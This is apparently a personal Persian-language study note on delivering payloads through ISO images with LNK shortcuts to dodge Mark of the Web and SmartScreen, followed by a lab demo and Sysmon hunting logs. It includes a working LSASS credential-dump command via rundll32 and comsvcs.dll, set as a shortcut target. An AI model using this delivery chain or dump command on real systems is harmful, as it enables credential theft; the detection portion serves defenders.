

این یک **تکنیک کلاسیک Initial Access** است. ساختارش را توضیح می‌دم:

---

## ساختار ISO مخرب

malware.iso
├── document.lnk        ← فایل میانبر مخرب (آیکون Word/PDF)
├── resume.lnk          ← فایل میانبر مخرب دوم
└── payload.dll         ← فایل hidden (با +H attribute)


فایل‌های `dll` و سایر payloadها با attribute **Hidden** ست می‌شن، کاربر فقط LNKها را می‌بینه.

---

## داخل فایل LNK

LNK یک shortcut است که Target Path آن به `rundll32.exe` اشاره می‌کند:

Target:
C:\Windows\System32\rundll32.exe  payload.dll,EntryPoint


یا با مسیر نسبی از درایو mount شده (مثلاً `D:`):

C:\Windows\System32\rundll32.exe  D:\payload.dll,#1


گاهی از wscript/mshta هم استفاده می‌شه:
C:\Windows\System32\mshta.exe  D:\payload.hta


---

## چرا ISO؟ (مزیت‌های تاکتیکی)

| دلیل                        | توضیح                                                                |
| --------------------------- | -------------------------------------------------------------------- |
| **MOTW Bypass**             | فایل‌های داخل ISO برچسب `Zone.Identifier` (Mark of the Web) نمی‌گیرن |
| **SmartScreen دور می‌خوره** | چون MOTW نداره، SmartScreen هشدار نمیده                              |
| **Auto-mount**              | دبل‌کلیک روی ISO در ویندوز ۱۰+ به‌صورت خودکار mount می‌شه            |
| **فایل‌های پنهان**          | DLL واقعی hidden است، کاربر آن را نمی‌بینه                           |
|                             |                                                                      |

#### Bypass SmartScreen


![[Pasted image 20260610120445.png]]


---

## فرآیند اجرا (Attack Chain)

User double-clicks ISO
        ↓
Windows mounts ISO as Drive Letter (e.g., D:\)
        ↓
User sees only LNK files (DLL is hidden)
        ↓
User double-clicks LNK
        ↓
rundll32.exe D:\payload.dll,EntryPoint↓
Malicious code executes (in-memory)


---

## آرتیفکت‌های فورنزیک این حمله

- **Prefetch:** `RUNDLL32.EXE-*.pf` با DLL مربوطه در لیست وابستگی‌ها
- **ShellBags:** مسیر درایو mount شده
- **LNK files:** در `Recent` — Target path به درایو ISO اشاره می‌کند
- **USN Journal:** mount شدن و دسترسی به فایل‌ها ثبت می‌شود
- **Event Log 4688:** اجرای `rundll32.exe` با آرگومان‌ها

این تکنیک در کمپین‌های **Emotet، BazarLoader و Qakbot** (پس از ۲۰۲۱) به‌صورت گسترده استفاده شد.


روی ویندوز با PowerShell و ابزار `oscdimg` (بخشی از Windows ADK) یا روش ساده‌تر با Python:

**روش Python (بدون نیاز به نصب چیزی اضافه):**

```python
import subprocess, os

# 1. ساخت پوشه محتوا
os.makedirs("iso_content", exist_ok=True)
with open("iso_content/hello.txt", "w") as f:
    f.write("hello")

# 2. ساخت ISO با pycdlib
# pip install pycdlib
import pycdlib

iso = pycdlib.PyCdlib()
iso.new(joliet=3)
iso.add_directory('/CONTENT', joliet_path='/content')
iso.add_fp(open("iso_content/hello.txt", "rb"), len("hello"), 
           '/HELLO.TXT;1', joliet_path='/hello.txt')
iso.write('output.iso')
iso.close()
print("ISO created: output.iso")
```

**یا با ابزار `mkisofs` (اگر روی لینوکس یا WSL هستید):**

```bash
mkdir iso_content
echo "hello" > iso_content/hello.txt
mkisofs -o output.iso -J -R iso_content/
```

**روی ویندوز خالص با oscdimg:**
```cmd
mkdir iso_content
echo hello > iso_content\hello.txt
oscdimg -n -m iso_content output.iso
```

> `oscdimg` داخل Windows ADK یا Windows AIK هست. نصبش از [اینجا](https://learn.microsoft.com/en-us/windows-hardware/get-started/adk-install).

بعد از double-click روی `output.iso` در ویندوز 10/11، به‌طور خودکار mount می‌شه و `hello.txt` داخلش قابل مشاهده‌ست.




### Demo

![[Pasted image 20260610122439.png]]

Create Lnk File 


Target
```
rundll32.exe comsvcs.dll, MiniDump 628 C:\lsass.DMP full
```

get PID Lsass.exe
###### Create ISO Via oscdimg.exe

```
oscdimg -n -m .\detection\ windows_10_edition2022_enterprise.iso
```

![[Pasted image 20260610122623.png]]



![[Pasted image 20260610122729.png]]

![[Pasted image 20260610122748.png]]

![[Pasted image 20260610122806.png]]



#### Hunting 

#### Log 1 --> EventID 11

```python
File created:
RuleName: -
UtcTime: 2026-06-10 19:17:25.589
ProcessGuid: {0f20a050-92ec-6a29-7e00-000000000b00}
ProcessId: 3720
Image: C:\Windows\Explorer.EXE
TargetFilename: C:\windows_10_edition2022_enterprise.iso
CreationUtcTime: 2026-06-10 19:17:25.589
User: WINDOWS10\charon
```

#### Log 2 ---> EventID 1

```python
Process Create:
RuleName: technique_id=T1204,technique_name=User Execution
UtcTime: 2026-06-10 19:18:28.908
ProcessGuid: {0f20a050-b884-6a29-9304-000000000b00}
ProcessId: 3284
Image: C:\Windows\System32\rundll32.exe
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
Description: Windows host process (Rundll32)
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: RUNDLL32.EXE
CommandLine: "C:\Windows\System32\rundll32.exe" comsvcs.dll, MiniDump 680 C:\lsass.DMP full
CurrentDirectory: C:\Windows\system32\
User: WINDOWS10\charon
LogonGuid: {0f20a050-92e3-6a29-03b5-050000000000}
LogonId: 0x5B503
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=84DDB2B3D1158485B2B66867CA9452930A258EDD,MD5=44B041922105E01BFD0D096123F7D312,SHA256=F1DC9560D0C381C78304D94F7BA469490017D9728A03C2DD32C3BE957FC9F923,IMPHASH=4DB27267734D1576D75C991DC70F68AC
ParentProcessGuid: {0f20a050-92ec-6a29-7e00-000000000b00}
ParentProcessId: 3720
ParentImage: C:\Windows\explorer.exe
ParentCommandLine: C:\Windows\Explorer.EXE
ParentUser: WINDOWS10\charon
```


#### Log 3 EventID ---> 1
```python
Process Create:
RuleName: technique_id=T1083,technique_name=File and Directory Discovery
UtcTime: 2026-06-10 19:19:47.588
ProcessGuid: {0f20a050-b8d3-6a29-9904-000000000b00}
ProcessId: 8228
Image: C:\Windows\System32\rundll32.exe
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
Description: Windows host process (Rundll32)
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: RUNDLL32.EXE
CommandLine: "C:\Windows\System32\rundll32.exe" comsvcs.dll, MiniDump 680 C:\lsass.DMP full
CurrentDirectory: C:\windows\system32\
User: WINDOWS10\charon
LogonGuid: {0f20a050-92e3-6a29-03b5-050000000000}
LogonId: 0x5B503
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=84DDB2B3D1158485B2B66867CA9452930A258EDD,MD5=44B041922105E01BFD0D096123F7D312,SHA256=F1DC9560D0C381C78304D94F7BA469490017D9728A03C2DD32C3BE957FC9F923,IMPHASH=4DB27267734D1576D75C991DC70F68AC
ParentProcessGuid: {0f20a050-aacb-6a29-3104-000000000b00}
ParentProcessId: 6240
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: "C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" 
ParentUser: WINDOWS10\charon
```

#### Log 4 EventID 7
```python
Image loaded:
RuleName: technique_id=T1003.004,technique_name=LSASS Memory
UtcTime: 2026-06-10 19:19:47.601
ProcessGuid: {0f20a050-b8d3-6a29-9904-000000000b00}
ProcessId: 8228
Image: C:\Windows\System32\rundll32.exe
ImageLoaded: C:\Windows\System32\comsvcs.dll
FileVersion: 2001.12.10941.16384 (WinBuild.160101.0800)
Description: COM+ Services
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: COMSVCS.DLL
Hashes: SHA1=88C7BD6A30CBFB069CD34B04B0844D4AABE0577C,MD5=67B51761A4BC3BD1B5367A22BA1A5B65,SHA256=1AEA658899018FB370C39412BA62E3E8E8FD7A636657593530BD67005B3754B7,IMPHASH=407CA0F7B523319D758A40D7C0193699
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: WINDOWS10\charon
```

#### Log 5 --> EventID 11
```python
File created:
RuleName: -
UtcTime: 2026-06-10 19:19:47.612
ProcessGuid: {0f20a050-b8d3-6a29-9904-000000000b00}
ProcessId: 8228
Image: C:\Windows\System32\rundll32.exe
TargetFilename: C:\lsass.DMP
CreationUtcTime: 2026-06-10 19:19:47.612
User: WINDOWS10\charon
```

#### Log 6 ---> EventID 10
```python
Process accessed:
RuleName: technique_id=T1003,technique_name=Credential Dumping
UtcTime: 2026-06-10 19:19:47.612
SourceProcessGUID: {0f20a050-b8d3-6a29-9904-000000000b00}
SourceProcessId: 8228
SourceThreadId: 6408
SourceImage: C:\Windows\System32\rundll32.exe
TargetProcessGUID: {0f20a050-92ce-6a29-0c00-000000000b00}
TargetProcessId: 680
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9c284|C:\Windows\SYSTEM32\ntdll.dll+d776a|C:\Windows\System32\KERNEL32.DLL+1de6c|C:\Windows\System32\KERNEL32.DLL+264fe|C:\Windows\SYSTEM32\dbgcore.DLL+99b1|C:\Windows\SYSTEM32\dbgcore.DLL+179b5|C:\Windows\SYSTEM32\dbgcore.DLL+11425|C:\Windows\SYSTEM32\dbgcore.DLL+6222|C:\Windows\SYSTEM32\dbgcore.DLL+6cfb|C:\Windows\System32\comsvcs.dll+22082|C:\Windows\System32\rundll32.exe+42eb|C:\Windows\System32\rundll32.exe+6769|C:\Windows\System32\KERNEL32.DLL+16fd4|C:\Windows\SYSTEM32\ntdll.dll+4cec1
SourceUser: WINDOWS10\charon
TargetUser: NT AUTHORITY\SYSTEM
```


### Other EventCode

##### EventID 4663 ---> Kernel Object

```python
An attempt was made to access an object.

Subject:
	Security ID:		WINDOWS10\charon
	Account Name:		charon
	Account Domain:		WINDOWS10
	Logon ID:		0x5B503

Object:
	Object Server:		Security
	Object Type:		Process
	Object Name:		\Device\HarddiskVolume1\Windows\System32\lsass.exe
	Handle ID:		0x168
	Resource Attributes:	-

Process Information:
	Process ID:		0x19e8
	Process Name:		C:\Windows\System32\rundll32.exe

Access Request Information:
	Accesses:		Read from process memory
				
	Access Mask:		0x10
```


###### حتی اگر فایل هم بعدا پاک بشه لاگش در USN Journal میمونه 

![[Pasted image 20260610125234.png]]


###### dbgcore.DLL ---> monitor
###### comsvcs.dll

## APT 29

#### گروه APT 29 با استفاده از تکنیک HTTP FIle Smmugeling همین فایل ISO انتقال داد به سیستم و SmartScreen رو دور زد 

##### Reference
OSEP ---> [[OSEP+ Pen 300/chapter 1|chapter 1]]



